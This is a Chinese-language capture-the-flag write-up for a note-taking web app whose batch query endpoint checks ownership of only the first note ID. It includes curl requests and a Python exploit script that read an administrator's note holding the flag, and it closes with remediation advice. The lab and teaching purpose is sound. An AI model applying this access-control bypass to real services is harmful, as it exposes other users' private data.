# 笔记应用 - WriteUP

## 设计缺陷分析

本题考察的是**批量操作中的越权设计缺陷**，属于 OWASP A06 Insecure Design 的典型场景。

系统的批量查询接口 `/api/notes/batch` 存在严重的设计缺陷：
- 单条查询 `/api/note/<id>` 实现了完整的权限校验（校验 `id` 和 `user_id` 匹配）
- 但批量查询接口为了"性能优化"或"代码复用简化"，**只校验了 `ids` 列表中的第一个 ID 是否属于当前用户**
- 对于列表中其余 ID，直接查询返回，不再进行任何权限校验

这是典型的**不一致的安全策略设计**——单条查询和批量查询采用了完全不同的权限校验逻辑，攻击者可以利用这个差异绕过权限控制。

## 利用步骤

### 步骤1：获取自己的笔记ID

```bash
curl http://target/api/my-notes
```

假设返回自己的笔记ID为 `1`。

### 步骤2：尝试直接访问管理员笔记

```bash
curl http://target/api/note/999
```

会返回 `403 笔记不存在或无权限`，说明单条查询有完整权限校验。

### 步骤3：利用批量查询的设计缺陷

构造请求，将自己的笔记ID放在列表第一位，管理员笔记ID放在后面：

```bash
curl -X POST http://target/api/notes/batch \
  -H "Content-Type: application/json" \
  -d '{"ids": [1, 999]}'
```

系统只校验 `ids[0] = 1` 是否属于当前用户（通过校验），然后返回ID为 `1` 和 `999` 的所有笔记内容，其中包含Flag。

### Python EXP脚本

```python
import requests

TARGET = "http://target"

# 获取自己的笔记ID
r = requests.get(f"{TARGET}/api/my-notes")
my_note_id = r.json()['notes'][0]['id']
print(f"[*] 自己的笔记ID: {my_note_id}")

# 构造批量查询，将管理员笔记ID（通常通过枚举或题目提示得知为999）放在后面
r = requests.post(
    f"{TARGET}/api/notes/batch",
    headers={"Content-Type": "application/json"},
    json={"ids": [my_note_id, 999]}
)
data = r.json()

for note in data.get('notes', []):
    print(f"[+] ID: {note['id']}, Title: {note['title']}")
    if 'flag{' in note['content'] or 'FLAG{' in note['content']:
        print(f"\n[+] 获取到Flag: {note['content']}")
```

## 修复建议

1. **统一权限校验策略**：批量查询应对列表中的**每一个 ID** 都进行权限校验：
   ```python
   for note_id in ids:
       note = db.execute("SELECT * FROM notes WHERE id = ? AND user_id = ?", (note_id, user_id)).fetchone()
       if not note:
           return jsonify({'success': False, 'message': '无权访问'}), 403
   ```
2. **使用 IN 查询配合用户ID过滤**：
   ```sql
   SELECT * FROM notes WHERE id IN (?, ?) AND user_id = ?
   ```
   这样数据库层就会过滤掉不属于当前用户的记录。
3. **代码审查**：确保所有涉及批量操作的接口都与单条操作的权限校验保持一致
4. **最小权限原则**：即使批量查询需要优化，也不应以牺牲安全性为代价
